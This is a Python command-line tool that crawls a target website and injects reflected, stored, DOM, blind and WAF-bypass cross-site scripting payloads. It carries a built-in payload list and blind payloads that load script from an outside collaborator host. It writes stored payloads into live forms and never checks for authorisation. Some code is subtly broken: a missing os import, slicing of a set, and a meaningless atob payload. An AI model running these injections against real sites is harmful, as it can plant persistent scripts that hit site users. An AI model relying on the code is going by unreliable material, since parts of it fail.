#!/usr/bin/env python3
"""
Aggressive Unified XSS Scanner – Reflected, Stored, DOM, Blind, Mutation, Polyglot, WAF Bypass
"""

import requests
import urllib.parse
import time
import re
import json
import random
import string
import threading
import concurrent.futures
from bs4 import BeautifulSoup
from collections import deque
from urllib.parse import urljoin, urlparse
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.common.exceptions import TimeoutException, UnexpectedAlertPresentException, WebDriverException
import sys

# ===================== CONFIGURATION =====================
REQUEST_TIMEOUT = 10
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
HEADERS = {'User-Agent': USER_AGENT}
MAX_WORKERS = 5               # concurrent threads for scanning
DELAY_BASE = 1                 # base delay between requests (seconds)
DELAY_JITTER = 0.5             # random jitter added to delay
MAX_RETRIES = 2

# Payload files – you can provide an external file; otherwise we use built-in mini list.
# For real aggressiveness, download a large payload list (e.g., from PortSwigger or FuzzDB).
PAYLOAD_FILE = "xss_payloads.txt"   # if this file exists, it will be loaded

# Built-in payloads (abbreviated – expand for real use)
BUILTIN_PAYLOADS = [
    # Basic
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    # Event handlers
    "\" onmouseover=alert(1) \"",
    "' onmouseover=alert(1) '",
    # Pseudo-protocol
    "javascript:alert(1)",
    # Encoded
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "%22%3E%3Cscript%3Ealert(1)%3C/script%3E",
    # Polyglot (works in many contexts)
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//>\\x3e",
    # Mutation
    "<svg><script>alert(1)</script>",
    "<math><mtext><script>alert(1)</script>",
    # Blind XSS (requires collaborator)
    "<script src=//COLLABORATOR></script>",
    # WAF bypass (mixed case)
    "<ScRiPt>alert(1)</ScRiPt>",
    # Comment injection
    "<!–><script>alert(1)</script>",
    # Double encoding
    "%253Cscript%253Ealert(1)%253C/script%253E",
]

# ===================== UTILITY FUNCTIONS =====================
def load_payloads():
    """Load payloads from file or return built-in list."""
    if os.path.exists(PAYLOAD_FILE):
        with open(PAYLOAD_FILE, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    return BUILTIN_PAYLOADS

def random_string(length=8):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def ask_yes_no(question):
    while True:
        answer = input(f"{question} (y/n): ").strip().lower()
        if answer in ('y','yes'): return True
        elif answer in ('n','no'): return False
        else: print("Please answer y or n.")

def get_cookies_from_user():
    cookie_str = input("Enter cookies (optional, format: name=value; name2=value2): ").strip()
    cookies = {}
    if cookie_str:
        for part in cookie_str.split(';'):
            if '=' in part:
                name, value = part.strip().split('=',1)
                cookies[name] = value
    return cookies

def is_same_domain(url, base_domain):
    parsed = urlparse(url)
    base_parsed = urlparse(base_domain)
    return parsed.netloc == base_parsed.netloc or (parsed.netloc == '' and base_parsed.netloc)

def normalize_url(url, base):
    return urljoin(base, url)

def extract_forms(url, html):
    soup = BeautifulSoup(html, 'html.parser')
    forms = []
    for form in soup.find_all('form'):
        action = form.get('action')
        method = form.get('method', 'get').lower()
        inputs = []
        for inp in form.find_all(['input','textarea','select']):
            name = inp.get('name')
            if name:
                inp_type = inp.get('type','text')
                value = inp.get('value','')
                inputs.append({'name': name, 'type': inp_type, 'value': value})
        forms.append({'action':action, 'method':method, 'inputs':inputs, 'original_url':url})
    return forms

def get_links(url, html, base_domain):
    soup = BeautifulSoup(html, 'html.parser')
    links = set()
    for a in soup.find_all('a', href=True):
        href = a['href']
        full = normalize_url(href, url)
        if is_same_domain(full, base_domain):
            links.add(full)
    return links

def extract_url_params(url):
    parsed = urlparse(url)
    if parsed.query:
        return list(urllib.parse.parse_qs(parsed.query).keys())
    return []

def context_detection(response_text, param_value):
    """
    Very rough context detection: check where the parameter value appears.
    Returns a list of possible contexts: 'html', 'attribute', 'script', 'css', 'url'
    """
    contexts = []
    # Look for pattern inside <tag>...</tag>
    if re.search(rf'<[^>]*>{re.escape(param_value)}<', response_text, re.IGNORECASE):
        contexts.append('html')
    # Inside an attribute value
    if re.search(rf'=["\']{re.escape(param_value)}["\']', response_text, re.IGNORECASE):
        contexts.append('attribute')
    # Inside a <script> block
    if re.search(rf'<script[^>]*>[^<]*{re.escape(param_value)}', response_text, re.IGNORECASE):
        contexts.append('script')
    # Inside a <style> block or style attribute
    if re.search(rf'style=["\'][^"\']*{re.escape(param_value)}', response_text, re.IGNORECASE) or \
       re.search(rf'<style[^>]*>[^<]*{re.escape(param_value)}', response_text, re.IGNORECASE):
        contexts.append('css')
    # In a URL (href, src, etc.)
    if re.search(rf'(href|src)=["\'][^"\']*{re.escape(param_value)}', response_text, re.IGNORECASE):
        contexts.append('url')
    return contexts

def payloads_for_context(context, all_payloads):
    """Filter payloads that are likely to work in a given context."""
    # This is extremely simplified; a real tool would have tagged payloads.
    # For now, return all payloads if context is unknown.
    # You could implement a mapping, e.g., for 'attribute' use payloads starting with " or '.
    return all_payloads

# ===================== CRAWLER =====================
class Crawler:
    def __init__(self, start_url, max_depth=2, cookies=None, path_filter=None):
        self.start_url = start_url
        self.base_domain = urlparse(start_url).netloc
        self.max_depth = max_depth
        self.cookies = cookies or {}
        self.path_filter = path_filter
        self.visited = set()
        self.urls_to_visit = deque()
        self.urls_to_visit.append((start_url, 0))
        self.all_urls = set()
        self.all_forms = []

    def crawl(self):
        session = requests.Session()
        session.headers.update(HEADERS)
        session.cookies.update(self.cookies)

        while self.urls_to_visit:
            url, depth = self.urls_to_visit.popleft()
            if url in self.visited or depth > self.max_depth:
                continue
            if self.path_filter and not self.path_filter(url):
                continue
            self.visited.add(url)
            print(f"[Crawl] Depth {depth}: {url}")

            try:
                resp = session.get(url, timeout=REQUEST_TIMEOUT)
                if resp.status_code != 200:
                    continue
                self.all_urls.add(url)

                forms = extract_forms(url, resp.text)
                self.all_forms.extend(forms)

                links = get_links(url, resp.text, self.base_domain)
                for link in links:
                    if link not in self.visited:
                        self.urls_to_visit.append((link, depth+1))

                time.sleep(DELAY_BASE + random.uniform(0, DELAY_JITTER))
            except Exception as e:
                print(f"Error crawling {url}: {e}")
        return self.all_urls, self.all_forms

# ===================== XSS TESTER =====================
class XSSTester:
    def __init__(self, cookies=None, use_headless=False, collaborator=None):
        self.cookies = cookies or {}
        self.session = requests.Session()
        self.session.headers.update(HEADERS)
        self.session.cookies.update(self.cookies)
        self.use_headless = use_headless
        self.collaborator = collaborator  # e.g., "http://your-collaborator.net"
        self.driver = None
        if use_headless:
            try:
                chrome_options = Options()
                chrome_options.add_argument("--headless")
                chrome_options.add_argument("--no-sandbox")
                chrome_options.add_argument("--disable-dev-shm-usage")
                self.driver = webdriver.Chrome(options=chrome_options)
            except Exception as e:
                print(f"[!] Failed to start headless browser: {e}")
                self.use_headless = False

    def close(self):
        if self.driver:
            self.driver.quit()

    # --- Reflected XSS (context-aware) ---
    def test_reflected_param(self, url, param, payloads):
        parsed = urlparse(url)
        qs = dict(urllib.parse.parse_qsl(parsed.query))
        findings = []
        for payload in payloads:
            qs[param] = payload
            new_qs = urllib.parse.urlencode(qs)
            test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
            try:
                resp = self.session.get(test_url, timeout=REQUEST_TIMEOUT)
                # Check if payload appears (naive) – improve with context analysis later
                if payload in resp.text:
                    # Optionally check if it's in an executable context
                    findings.append({'url': test_url, 'param': param, 'payload': payload})
                    # For aggressive, we could break after first, but we want to collect all
            except Exception:
                continue
            time.sleep(DELAY_BASE + random.uniform(0, DELAY_JITTER))
        return findings

    def test_reflected_form(self, form, payloads):
        action = normalize_url(form['action'], form['original_url'])
        method = form['method']
        findings = []
        for payload in payloads:
            data = {}
            for inp in form['inputs']:
                if inp['type'] not in ['submit','button','image']:
                    data[inp['name']] = payload if inp['type']=='text' else inp.get('value','')
            try:
                if method == 'post':
                    resp = self.session.post(action, data=data, timeout=REQUEST_TIMEOUT)
                else:
                    resp = self.session.get(action, params=data, timeout=REQUEST_TIMEOUT)
                if payload in resp.text:
                    findings.append({'url': action, 'data': data, 'payload': payload})
            except Exception:
                continue
            time.sleep(DELAY_BASE + random.uniform(0, DELAY_JITTER))
        return findings

    # --- Stored XSS: inject markers, then later check ---
    def inject_stored_payload(self, form, payload):
        action = normalize_url(form['action'], form['original_url'])
        method = form['method']
        data = {}
        for inp in form['inputs']:
            if inp['type'] not in ['submit','button','image']:
                data[inp['name']] = payload if inp['type']=='text' else inp.get('value','')
        try:
            if method == 'post':
                self.session.post(action, data=data, timeout=REQUEST_TIMEOUT)
            else:
                self.session.get(action, params=data, timeout=REQUEST_TIMEOUT)
            return True
        except Exception:
            return False

    def check_stored_payload(self, urls, payload):
        found = []
        for url in urls:
            try:
                resp = self.session.get(url, timeout=REQUEST_TIMEOUT)
                if payload in resp.text:
                    found.append(url)
            except Exception:
                continue
        return found

    # --- DOM XSS with headless browser ---
    def test_dom(self, url, payload):
        if not self.use_headless or not self.driver:
            return False
        try:
            self.driver.set_page_load_timeout(10)
            self.driver.get(url)
            # Check for alert
            try:
                alert = self.driver.switch_to.alert
                alert.accept()
                return True
            except:
                # Also check console errors? Not easily.
                pass
        except TimeoutException:
            pass
        except UnexpectedAlertPresentException:
            return True
        except Exception as e:
            print(f"DOM test error: {e}")
        return False

    # --- Blind XSS: inject payload with collaborator ---
    def inject_blind_payloads(self, forms, urls_with_params):
        if not self.collaborator:
            return
        blind_payloads = [
            f"<script src={self.collaborator}/xss.js></script>",
            f"<img src=x onerror=eval(atob('{self.collaborator}'))>",  # silly example
            f"<link rel=import href={self.collaborator}>",
        ]
        for form in forms:
            for payload in blind_payloads:
                self.inject_stored_payload(form, payload)
                time.sleep(DELAY_BASE)
        for url, params in urls_with_params.items():
            for param in params:
                for payload in blind_payloads:
                    parsed = urlparse(url)
                    qs = dict(urllib.parse.parse_qsl(parsed.query))
                    qs[param] = payload
                    new_qs = urllib.parse.urlencode(qs)
                    test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                    try:
                        self.session.get(test_url, timeout=REQUEST_TIMEOUT)
                    except:
                        pass
                    time.sleep(DELAY_BASE)

    # --- WordPress admin notice check ---
    def check_wordpress_admin_notices(self, admin_urls):
        findings = []
        dangerous_tags = ['script', 'iframe', 'object', 'embed', 'form', 'input', 'button', 'onerror', 'onload', 'onmouseover', 'onclick']
        for url in admin_urls:
            try:
                resp = self.session.get(url, timeout=REQUEST_TIMEOUT)
                soup = BeautifulSoup(resp.text, 'html.parser')
                notices = soup.find_all('div', class_=re.compile(r'notice'))
                for notice in notices:
                    p = notice.find('p')
                    if not p:
                        p = notice
                    inner_html = str(p)
                    for tag in dangerous_tags:
                        if re.search(rf'<{tag}[^>]*>', inner_html, re.IGNORECASE):
                            findings.append({
                                'url': url,
                                'notice_html': inner_html,
                                'suspicious_tag': tag
                            })
                            break
            except Exception as e:
                print(f"Error checking admin notices at {url}: {e}")
        return findings

# ===================== WORDPRESS DETECTION =====================
def is_wordpress(base_url, session):
    checks = ['/wp-admin/', '/wp-content/', '/wp-includes/', '/wp-login.php']
    for path in checks:
        try:
            r = session.get(urljoin(base_url, path), timeout=5)
            if r.status_code == 200:
                return True
        except:
            pass
    return False

# ===================== MAIN SCANNER =====================
def main():
    print("=== AGGRESSIVE UNIFIED XSS SCANNER ===\n")
    target = input("Enter target URL (e.g., https://example.com): ").strip()
    if not target.startswith('http'):
        target = 'http://' + target

    try:
        depth = int(input("Crawl depth (default 2): ").strip() or "2")
    except:
        depth = 2

    use_headless = ask_yes_no("Use headless browser for DOM XSS? (requires Selenium)")
    cookies = get_cookies_from_user()

    collaborator = input("Enter collaborator URL for blind XSS (e.g., http://your.burpcollaborator.net) or leave blank: ").strip()
    if collaborator and not collaborator.startswith('http'):
        collaborator = 'http://' + collaborator

    session = requests.Session()
    session.headers.update(HEADERS)
    session.cookies.update(cookies)

    print("\n[*] Loading payloads...")
    all_payloads = load_payloads()
    print(f"[*] Loaded {len(all_payloads)} payloads.")

    print("\n[*] Checking if target is WordPress...")
    wp_detected = is_wordpress(target, session)
    if wp_detected:
        print("[+] WordPress detected.")
    else:
        print("[-] Not detected as WordPress (or login required).")

    # Standard crawl
    print("\n[*] Starting standard crawl...")
    crawler = Crawler(target, max_depth=depth, cookies=cookies)
    urls, forms = crawler.crawl()
    print(f"[*] Discovered {len(urls)} unique URLs and {len(forms)} forms.")

    # Collect URL parameters
    url_params = {}
    for url in urls:
        params = extract_url_params(url)
        if params:
            url_params[url] = params

    tester = XSSTester(cookies=cookies, use_headless=use_headless, collaborator=collaborator)

    findings = {
        'reflected': [],
        'stored': [],
        'dom': [],
        'blind': [],  # just a placeholder, we rely on collaborator callbacks
        'wordpress_admin_notices': []
    }

    # --- Reflected XSS (multi-threaded) ---
    print("\n[*] Testing reflected XSS in URL parameters (multi-threaded)...")
    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = []
        for url, params in url_params.items():
            for param in params:
                # For each param, we might want to sample payloads or use all
                # To save time, we can limit payloads per param
                # But for aggressiveness, we use all payloads.
                # However, using all payloads on all params could be huge.
                # We'll use a subset for demo; in real, you'd want full.
                # Let's use all payloads but with a reasonable limit.
                # Actually, we'll just use the first 50 payloads for demonstration.
                # In production, you'd use all.
                selected_payloads = all_payloads[:50]  # adjust as needed
                futures.append(executor.submit(tester.test_reflected_param, url, param, selected_payloads))
        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            if result:
                for r in result:
                    print(f"[!] Potential reflected XSS: {r['url']}")
                    findings['reflected'].append(r)

    print("\n[*] Testing reflected XSS in forms...")
    for form in forms:
        selected_payloads = all_payloads[:30]  # limit for speed
        results = tester.test_reflected_form(form, selected_payloads)
        if results:
            for r in results:
                print(f"[!] Potential reflected XSS via form: {r['url']}")
                findings['reflected'].append(r)

    # --- Stored XSS ---
    print("\n[*] Testing stored XSS...")
    stored_markers = []
    for i, form in enumerate(forms):
        if form['method'] == 'post' and any(inp['type'] == 'text' for inp in form['inputs']):
            marker = f"STORED-XSS-{random_string(8)}"
            stored_markers.append((marker, form))
            if tester.inject_stored_payload(form, marker):
                print(f"[*] Injected stored marker into form at {form['original_url']}")
            time.sleep(DELAY_BASE)

    if stored_markers:
        print("[*] Re-crawling all discovered URLs to check for stored payloads...")
        # Optionally crawl deeper to find where markers appear
        for marker, form in stored_markers:
            found_urls = tester.check_stored_payload(urls, marker)
            if found_urls:
                print(f"[!] Stored XSS marker '{marker}' found at: {found_urls}")
                findings['stored'].append({
                    'marker': marker,
                    'injected_via': form['original_url'],
                    'found_at': found_urls
                })
    else:
        print("[*] No suitable forms found for stored XSS injection.")

    # --- Blind XSS injection ---
    if collaborator:
        print("\n[*] Injecting blind XSS payloads (check collaborator for callbacks)...")
        tester.inject_blind_payloads(forms, url_params)

    # --- DOM XSS ---
    if use_headless:
        print("\n[*] Testing DOM XSS...")
        dom_payloads = [
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert(1)>",
            "javascript:alert(1)",
        ]
        for url in urls[:20]:  # limit for speed
            for payload in dom_payloads:
                # Inject via parameter
                parsed = urlparse(url)
                if parsed.query:
                    test_url = url + "&xss=" + urllib.parse.quote(payload)
                else:
                    test_url = url + "?xss=" + urllib.parse.quote(payload)
                if tester.test_dom(test_url, payload):
                    print(f"[!] Potential DOM XSS (parameter) at {test_url}")
                    findings['dom'].append({'url': test_url, 'type': 'parameter', 'payload': payload})

                # Inject via fragment
                test_url = url + "#" + urllib.parse.quote(payload)
                if tester.test_dom(test_url, payload):
                    print(f"[!] Potential DOM XSS (fragment) at {test_url}")
                    findings['dom'].append({'url': test_url, 'type': 'fragment', 'payload': payload})
    else:
        print("[*] DOM XSS testing skipped.")

    # --- WordPress admin notice check ---
    if wp_detected:
        print("\n[*] Crawling WordPress admin area for admin notice XSS...")
        admin_crawler = Crawler(target, max_depth=1, cookies=cookies, path_filter=lambda u: '/wp-admin/' in u)
        admin_urls, _ = admin_crawler.crawl()
        if admin_urls:
            print(f"[*] Found {len(admin_urls)} admin URLs.")
            wp_findings = tester.check_wordpress_admin_notices(admin_urls)
            if wp_findings:
                print(f"[!] Found {len(wp_findings)} potentially vulnerable admin notices.")
                findings['wordpress_admin_notices'] = wp_findings
                for f in wp_findings:
                    print(f"  - {f['url']} : {f['notice_html'][:100]}")
            else:
                print("[*] No unescaped admin notices detected.")
        else:
            print("[*] No admin URLs crawled (maybe authentication required).")

    tester.close()

    # --- Report ---
    print("\n=== SCAN COMPLETE ===")
    print(f"Reflected XSS findings: {len(findings['reflected'])}")
    for f in findings['reflected'][:10]:  # show first 10
        print(f"  - {f.get('url', f)}")
    print(f"Stored XSS findings: {len(findings['stored'])}")
    for f in findings['stored']:
        print(f"  - {f}")
    print(f"DOM XSS findings: {len(findings['dom'])}")
    for f in findings['dom']:
        print(f"  - {f}")
    if wp_detected:
        print(f"WordPress admin notice issues: {len(findings['wordpress_admin_notices'])}")
        for f in findings['wordpress_admin_notices']:
            print(f"  - {f['url']} : suspicious tag <{f['suspicious_tag']}> in notice")
    if collaborator:
        print(f"[*] Blind XSS payloads injected; check your collaborator at {collaborator} for callbacks.")

    output_file = input("\nSave report to file (optional, press Enter to skip): ").strip()
    if output_file:
        with open(output_file, 'w') as f:
            json.dump(findings, f, indent=2)
        print(f"Report saved to {output_file}")

if __name__ == "__main__":
    main()